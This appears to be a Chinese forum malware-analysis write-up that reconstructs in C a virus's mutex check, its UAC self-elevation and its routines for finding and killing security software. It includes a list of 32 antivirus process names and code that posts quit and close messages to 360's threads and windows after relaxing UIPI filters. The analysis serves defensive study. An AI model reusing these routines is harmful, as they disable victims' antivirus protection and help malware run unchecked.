
# 样本行为分析

## 互斥体创建

```
__int64 CreateMutex_3575D2652C4F5C20EB78D147D5670A9C()
{
    HANDLE h1 = CreateMutexA(nullptr, FALSE, "Global\\3575D265-2C4F-5C20-EB78-D147D5670A9C");
    if (GetLastError() == ERROR_ALREADY_EXISTS)
        return 0;

    HANDLE h2 = OpenMutexA(SYNCHRONIZE, FALSE, "Global\\3575D265-2C4F-5C20-EB78-D147D5670A9C");
    if (h2)
    {
        CloseHandle(h2);
        return 0;
    }
    return 1;
}
```

### (5) 程序再次检查自身是否有 UAC 权限

程序再次检查自身是否有 UAC 权限，如果没有则尝试管理员运行自身。

![](https://attach.52pojie.cn/forum/202509/25/210345x63og6lql3a7i2o3.png)

图片：`image.png`（90.79 KB，下载次数：0）

[附件链接](https://www.52pojie.cn/forum.php?mod=attachment&aid=MjgwNTMxOHwwNzE3OTllYXwxNzkzNTc2NjIzfDE2ODA4NnwyMDYyNTQ5&nothumb=yes)

2025-9-25 21:03 上传，程序以 UAC 权限运行自身代码图。

```
__int64 try_run_self_with_uac()
{
    if (IsProcessElevated())
        return 0;
 
    CHAR selfPath[zxsq-anti-bbcode-MAX_PATH] = {};
    GetModuleFileNameA(nullptr, selfPath, MAX_PATH);
 
    SHELLEXECUTEINFOA sei{};
    sei.cbSize       = sizeof(sei);
    sei.fMask        = SEE_MASK_NOCLOSEPROCESS;
    sei.lpVerb       = "runas";
    sei.lpFile       = selfPath;
    sei.lpParameters = "";
    sei.nShow        = SW_HIDE;
 
    if (ShellExecuteExA(&sei))
        CloseHandle(sei.hProcess);
 
    ExitProcess(0);
    return 0;
}
```

## [2] 感染载荷对抗安全软件

接下来，病毒进入感染主流程，首先开始与安全软件进行对抗。

### (1) 通用式检测是否安装安全软件

所有安全软件进程名从内存中解密释放。其中被解密的数据如下：

```
360Safe.exe 360sd.exe 360rp.exe 360rps.exe 360Tray.exe ZhuDongFangYu.exe 360leakfixer.exe 360sdrun.exe 360sdupd.exe 360FileGuard.exe dep360.exe HipsMain.exe HipsDaemon.exe HipsTray.exe HRUpdate.exe HipsLog.exe LeaovoPcManagerService.exe LenovoPcManager.exe LAVService.exe LenovoTray.exe wsctrl7.exe wsctrl10.exe wsctrl11.exe Bka.exe BLuPro.exe BkavService.exe BkavUtil.exe cefutil.exe QHSafeMain.exe QHSafeTray.exe QQPCTray.exe QQPCRTP.exe
```

内存中解密安全软件名称代码图。

随后，病毒遍历所有进程，当找到对应的安全软件时返回其 PID，并且设置一个全局标志位代表存在安全软件。

遍历所有进程并在找到安全软件时设置全局标志位图。

```
__int64 DetectSafeSoftwareAndReturnProcessId()
{
    static const char* safeList[zxsq-anti-bbcode-32] = {
        "360Safe.exe","360sd.exe","360rp.exe","360rps.exe", 
        "360Tray.exe","ZhuDongFangYu.exe","360leakfixer.exe","360sdrun.exe", 
        "360sdupd.exe","360FileGuard.exe","dep360.exe","HipsMain.exe", 
        "HipsDaemon.exe","HipsTray.exe","HRUpdate.exe","HipsLog.exe", 
        "LeaovoPcManagerService.exe","LenovoPcManager.exe","LAVService.exe","LenovoTray.exe", 
        "wsctrl7.exe","wsctrl10.exe","wsctrl11.exe","Bka.exe", 
        "BLuPro.exe","BkavService.exe","BkavUtil.exe","cefutil.exe", 
        "QHSafeMain.exe","QHSafeTray.exe","QQPCTray.exe","QQPCRTP.exe"
    };
 
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE)
        return -1;
 
    PROCESSENTRY32 pe{};
    pe.dwSize = sizeof(pe);
 
    if (!Process32First(snap, &pe)) {
        CloseHandle(snap);
        return 0;
    }
 
    do {
        for (int i = 0; i 
```

### (2) 针对360进行检测与攻击

病毒通过寻找是否有 `360tray.exe`、`360sd.exe`、`360safe.exe`，或者存在类名为 `"Q360SafeMonClass"` 窗口的方式确定是否有 360 安全软件正在运行。

![](https://attach.52pojie.cn/forum/202509/25/210730wh6ejhic423howw6.png)

图片：`image.png`（84.6 KB，下载次数：0）

[附件链接](https://www.52pojie.cn/forum.php?mod=attachment&aid=MjgwNTMyNXw4NzkwNDcwNnwxNzkzNTc2NjIzfDE2ODA4NnwyMDYyNTQ5&nothumb=yes)

2025-9-25 21:07 上传，检查是否有 360 安全软件代码图。

```
int CheckIsThere360(void)
{
    if (GetProcessIdByName("360tray.exe") != 0)   // 360Tray
        return 1;
    if (GetProcessIdByName("360sd.exe")   != 0)   // 360SD
        return 1;
    if (GetProcessIdByName("360safe.exe") != 0)   // 360Safe
        return 1;

    char  tmpBuf[zxsq-anti-bbcode-32] = {0};
    BYTE  tmpKey[zxsq-anti-bbcode-32] = {0};
    const char *cls = decrypt_data_7(get_encrypt_data_6(tmpBuf, tmpKey)); // Q360SafeMonClass
    if (FindWindowExA(NULL, NULL, cls, NULL) != NULL)
        return 1;

    return 0;
}
```

如果发现 360 相关安全产品正在运行，病毒循环 3 次，每次间隔 5 秒创建对 360 的攻击线程，如果 360 被关闭，则终止循环。

```
__int64 StartAddress(void *Parameter)
{
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot != INVALID_HANDLE_VALUE)
    {
        PROCESSENTRY32 pe;
        pe.dwSize = sizeof(pe);
        if (Process32First(hSnapshot, &pe))
        {
            do
            {
                const char *name = pe.szExeFile;
                if (!_stricmp(name, "360tray.exe") ||
                    !_stricmp(name, "360sd.exe")   ||
                    !_stricmp(name, "360safe.exe"))
                {
                    EnumWindows(EnumFunc, pe.th32ProcessID);
                    HWND hWnd = FindWindowExA(NULL, NULL, "Q360SafeMonClass", NULL);
                    PostMessageA(hWnd, WM_CLOSE, 0, 0);
                }
            }
            while (Process32Next(hSnapshot, &pe));
        }
        CloseHandle(hSnapshot);
    }
    return 0;
}
__int64 EnumFunc(HWND hWnd, int targetPid)
{
    DWORD pid;
    GetWindowThreadProcessId(hWnd, &pid);

    if (pid == (DWORD)targetPid)
    {
        ChangeWindowMessageFilterEx(hWnd, 0x12, 1, 0);
        ChangeWindowMessageFilter(0x12, 1);
        PostThreadMessage_WM_QUIT_EnumAllThread_ByProcessId(targetPid);
        PostMessageA(hWnd, 0x12, 0, 0);
        SendMessageA(hWnd, 0x10, 0, 0);
        GenerateConsoleCtrlEvent(2, pid);
    }

    return 1;
}
int PostThreadMessage_WM_QUIT_EnumAllThread_ByProcessId(int pid)
{
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE)
        return 0;

    THREADENTRY32 te;
    te.dwSize = sizeof(te);

    if (!Thread32First(hSnapshot, &te))
    {
        CloseHandle(hSnapshot);
        return 0;
    }

    do
    {
        if (te.th32OwnerProcessID == (DWORD)pid)
            PostThreadMessageA(te.th32ThreadID, WM_QUIT, 0, 0);
    }
    while (Thread32Next(hSnapshot, &te));

    CloseHandle(hSnapshot);
    return 1;
}
```

其中线程遍历进程找到 `360tray.exe`、`360sd.exe`、`360safe.exe`，然后通过进程 ID 枚举进程下的所有窗口。

遍历 360 安全软件对应窗口代码图。

### 窗口枚举回调与线程终止

在窗口枚举回调中，病毒首先通过窗口句柄获取对应的进程 ID。然后通过 `ChangeWindowMessageFilter` 系列函数修改窗口的 UIPI 消息过滤器，具体来说，UIPI 是一种安全功能，用于防止从较低完整性级别的发件人接收消息。可以使用此函数允许将特定消息传递到窗口，即使消息源自较低完整性级别的进程也是如此。

![](https://attach.52pojie.cn/forum/202509/25/211103qa23fgral3t3atgr.png)

图片：`image.png`（111.96 KB，下载次数：0）

[附件链接](https://www.52pojie.cn/forum.php?mod=attachment&aid=MjgwNTMyNnw0ZTg2ODUwMXwxNzkzNTc2NjIzfDE2ODA4NnwyMDYyNTQ5&nothumb=yes)

2025-9-25 21:11 上传，感染载荷窗口枚举回调代码图。

感染载荷窗口枚举回调代码图。病毒通过进程 ID 枚举进程的所有线程，然后通过 `PostThreadMessageA` 向所有线程发送 `WM_QUIT` 信息，从而请求对应的线程收到消息后退出。病毒再向对应的窗口通过 `PostMessageA` 发送 `WM_QUIT` 请求，通过 `SendMessageA` 发送 `WM_CLOSE` 请求。然后调用 `GenerateConsoleCtrlEvent(2， 进程ID)` 来将指定的信号发送到控制台进程组，但是从 Windows 官方文档和对 `kernelbase.dll` 的逆向结果来看，这个函数并不支持 `ID=2` 的消息，这里认为是病毒作者笔误，原本应该是想要对控制组发送 `Ctrl+C` 消息来强行关闭对应控制台的。这里对 Windows 10 18362 版本中未做任何补丁的 `kernelbase.dll` 和 Windows 11 22631 虚拟机中的 `kernelbase.dll` 都做了逆向分析，都是没有定义 `ID=2` 的消息的，排除了历史遗留问题。

文件名/系统版本
